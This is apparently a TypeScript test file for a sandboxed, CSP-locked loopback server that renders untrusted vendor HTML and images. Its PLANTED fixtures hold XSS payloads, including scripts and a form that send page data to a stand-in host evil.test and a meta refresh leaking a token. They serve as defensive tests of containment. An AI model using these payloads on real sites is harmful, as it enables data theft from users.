import { afterEach, describe, it } from "node:test";
import assert from "node:assert/strict";
import http from "node:http";
import { readFileSync } from "node:fs";
import {
  VIEW_CSP, MAX_HTML_BYTES, MAX_IMAGE_BYTES, startViewServer, prepareFramePayload, setActiveViewServer, type ViewServer,
} from "../src/review-view-server.ts";
import { REVIEW_CSP, reviewCsp } from "../src/timeline/rail/page.ts";
import type { DiffObject, Payload } from "../src/connector/diff-object.ts";

// Vendor html and image payloads draw in a sandboxed frame on a second loopback origin. Isolation is the origin plus the sandbox plus the CSP, never
// sanitizing: the markup is served byte for byte, so each planted escape is checked from the served headers and body. A real-browser run is separate.

const TOKEN = "tok-MAIN-PAGE-SECRET-123";
const started: ViewServer[] = [];
afterEach(() => { setActiveViewServer(undefined); for (const v of started.splice(0)) v.server.close(); });
const boot = async () => { const v = await startViewServer(); started.push(v); return v; };

function get(url: string, opts: { host?: string; method?: string } = {}): Promise<{ status: number; headers: http.IncomingHttpHeaders; body: string }> {
  const u = new URL(url);
  return new Promise((resolve, reject) => {
    const r = http.request({ host: "127.0.0.1", port: u.port, path: u.pathname, method: opts.method ?? "GET", headers: { host: opts.host ?? u.host } }, (res) => {
      let body = ""; res.setEncoding("utf8"); res.on("data", (d) => { body += d; }); res.on("end", () => resolve({ status: res.statusCode ?? 0, headers: res.headers, body }));
    });
    r.on("error", reject); r.end();
  });
}

const PNG = Buffer.concat([Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]), Buffer.alloc(16)]).toString("base64");

const PLANTED: Record<string, string> = {
  "a script tag": `<script>fetch("http://evil.test/?t="+parent.location.href)</script>`,
  "an inline event handler": `<img src=x onerror="fetch('http://evil.test/')">`,
  "a meta refresh": `<meta http-equiv="refresh" content="0;url=http://127.0.0.1:1/?t=${TOKEN}">`,
  "a remote img": `<img src="http://evil.test/p.png">`,
  "a remote css url": `<style>body{background:url(http://evil.test/b.png)}</style>`,
  "a form post": `<form action="http://evil.test/" method="post"><input name=t value=x><button>go</button></form>`,
  "a link to the main origin with the token": `<a href="http://127.0.0.1:5000/?token=${TOKEN}" target="_top">open</a>`,
  "an svg with script": `<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script><rect onload="alert(2)"/></svg>`,
};

describe("view listener: planted escapes are contained by headers, not by editing the markup", () => {
  for (const [name, markup] of Object.entries(PLANTED)) {
    it(`${name}: served verbatim under the no-network CSP with sandbox and no script-src`, async () => {
      const v = await boot();
      const type = name === "an svg with script" ? "image" : "html";
      const prepared = prepareFramePayload({ type, value: type === "image" ? Buffer.from(markup).toString("base64") : markup } as Payload);
      assert.ok(prepared.ok, "svg is served as html, not refused");
      const r = await get(v.mint((prepared as { html: string }).html));
      assert.equal(r.status, 200);
      assert.equal(r.headers["content-security-policy"], VIEW_CSP);
      assert.equal(VIEW_CSP, "default-src 'none'; img-src data:; style-src 'unsafe-inline'; sandbox");
      assert.ok(!/script-src/.test(VIEW_CSP) && !/allow-/.test(VIEW_CSP) && !/connect-src|form-action|frame-src/.test(VIEW_CSP));
      assert.match(String(r.headers["content-type"]), /^text\/html/);
      assert.equal(r.headers["x-content-type-options"], "nosniff");
      assert.equal(r.headers["referrer-policy"], "no-referrer");
      assert.equal(r.body, markup, "markup is not sanitized or rewritten");
    });
  }

  it("the main page token never reaches the view origin (no token in any response, no cookie set, no reference to the main port)", async () => {
    const v = await boot();
    const r = await get(v.mint("<p>hello</p>"));
    assert.ok(!JSON.stringify(r).includes(TOKEN));
    assert.equal(r.headers["set-cookie"], undefined);
    assert.equal(r.headers["access-control-allow-origin"], undefined);
  });

  it("serves only /v/<id> by GET, reusably, and only to its own Host", async () => {
    const v = await boot();
    const url = v.mint("<p>once</p>");
    assert.equal((await get(url, { method: "POST" })).status, 405);
    assert.equal((await get(url, { host: "evil.test" })).status, 403);
    assert.equal((await get(`${v.origin}/`)).status, 404);
    assert.equal((await get(`${v.origin}/v/${"0".repeat(32)}`)).status, 404);
    assert.equal((await get(`${v.origin}/v/..%2f..%2fetc`)).status, 404);
    assert.equal((await get(url)).status, 200);
    assert.equal((await get(url)).status, 200, "reusable: a cached model body's frame still loads on a second fetch");
    assert.equal(v.mint("<p>once</p>"), url, "same content, same id");
    assert.notEqual(v.mint("x"), v.mint("y"), "different content, different id");
    assert.match(url, /\/v\/[0-9a-f]{32}$/);
  });
});

describe("store bound", () => {
  it("an evicted id answers 404 and minting again restores it", async () => {
    const v = await boot();
    const first = v.mint("doc-0");
    for (let i = 1; i <= 400; i++) v.mint(`doc-${i}`);
    assert.ok(v.pending() <= 300);
    assert.equal((await get(first)).status, 404);
    assert.equal(v.mint("doc-0"), first);
    assert.equal((await get(first)).status, 200);
  });
});

describe("caps and image rules", () => {
  it("html over 512 KiB and images over 4 MiB show the placeholder reason", () => {
    const big = prepareFramePayload({ type: "html", value: "a".repeat(MAX_HTML_BYTES + 1) });
    assert.equal(big.ok, false);
    assert.match((big as { reason: string }).reason, /over the 524288 byte limit/);
    assert.equal(prepareFramePayload({ type: "html", value: "a".repeat(MAX_HTML_BYTES) }).ok, true);
    const img = prepareFramePayload({ type: "image", value: Buffer.concat([Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]), Buffer.alloc(MAX_IMAGE_BYTES)]).toString("base64") });
    assert.equal(img.ok, false);
    assert.match((img as { reason: string }).reason, /4194304 byte limit/);
  });

  it("a raster draws as data: only after the magic-number check, by its real type", () => {
    const ok = prepareFramePayload({ type: "image", value: PNG });
    assert.ok(ok.ok && ok.html.includes(`src="data:image/png;base64,${PNG}"`));
    // A claimed png that is really html is refused, and a data: URL's claimed type is not trusted.
    const lie = prepareFramePayload({ type: "image", value: `data:image/png;base64,${Buffer.from("<b>hi</b>").toString("base64")}` });
    assert.equal(lie.ok, false);
    assert.match((lie as { reason: string }).reason, /not a PNG, JPEG, GIF or WebP/);
    assert.equal(prepareFramePayload({ type: "image", value: { not: "a string" } }).ok, false);
    for (const bytes of [[0xff, 0xd8, 0xff, 0xe0], [...Buffer.from("GIF89a")], [...Buffer.from("RIFF"), 0, 0, 0, 0, ...Buffer.from("WEBP")]]) {
      assert.equal(prepareFramePayload({ type: "image", value: Buffer.from(bytes).toString("base64") }).ok, true);
    }
  });

  it("SVG is html: served as text, under the html cap", () => {
    const svg = `<svg xmlns="http://www.w3.org/2000/svg"><script>1</script></svg>`;
    const r = prepareFramePayload({ type: "image", value: `data:image/svg+xml;base64,${Buffer.from(svg).toString("base64")}` });
    assert.ok(r.ok && r.html === svg);
    assert.equal(prepareFramePayload({ type: "image", value: Buffer.from("<svg>" + "a".repeat(MAX_HTML_BYTES)).toString("base64") }).ok, false);
  });
});

describe("the page side", () => {
  it("a hostile image value gives the placeholder with a reason and never throws", () => {
    const PNGB = Buffer.concat([Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]), Buffer.alloc(16)]).toString("base64");
    for (const value of ["data:image/png,%", "data:image/png,%E0%A4%A", 7, { a: 1 }, null, PNGB.slice(0, 5), "data:image/png;base64,iVBO"]) {
      const r = prepareFramePayload({ type: "image", value } as Payload);
      assert.equal(r.ok, false, JSON.stringify(value));
      assert.ok(!r.ok && r.reason.length > 0);
    }
  });

  it("the page CSP gains only frame-src for that exact origin", async () => {
    const v = await boot();
    assert.equal(reviewCsp(), REVIEW_CSP);
    assert.equal(reviewCsp(v.origin), `${REVIEW_CSP}; frame-src ${v.origin}`);
    assert.ok(!REVIEW_CSP.includes("frame-src"));
  });

  it("review.js draws a frame as <iframe sandbox> with no allow- flags, never innerHTML of the payload", () => {
    const js = readFileSync(new URL("../src/timeline/rail/assets/review.js", import.meta.url), "utf8");
    assert.match(js, /el\('iframe', \{[^}]*sandbox: ''[^}]*src: d\.src/);
    assert.ok(!/allow-scripts|allow-same-origin/.test(js));
  });
});
